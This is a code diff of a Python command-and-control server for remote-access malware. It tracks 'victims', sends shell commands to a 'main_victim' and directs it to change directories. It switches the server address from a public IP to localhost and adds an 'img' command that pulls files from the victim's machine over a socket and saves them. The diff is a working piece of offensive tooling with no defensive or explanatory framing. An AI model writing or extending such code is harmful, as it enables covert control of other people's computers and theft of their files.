@@ -6,7 +6,8 @@ from sys import executable, argv
 import os
 
 victims = {}
-ip_server = "147.161.8.230"
+
+ip_server = "localhost"
 port_server = 1234
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -98,6 +99,14 @@ def shell_command():
             elif array_command[0] == "start":
                 send_command(command)         
                 
+            elif array_command[0] == "img":
+                send_command(command)
+                size = int(get_data().decode("utf-8"))
+                file = open(array_command[1], 'wb')
+                data = main_victim.recv(size)
+                file.write(data)
+                file.close()
+
             elif array_command[0] == "cd_sys":
                 os.chdir(array_command[1])
                 print(f"Changed directory to {os.getcwd()}")
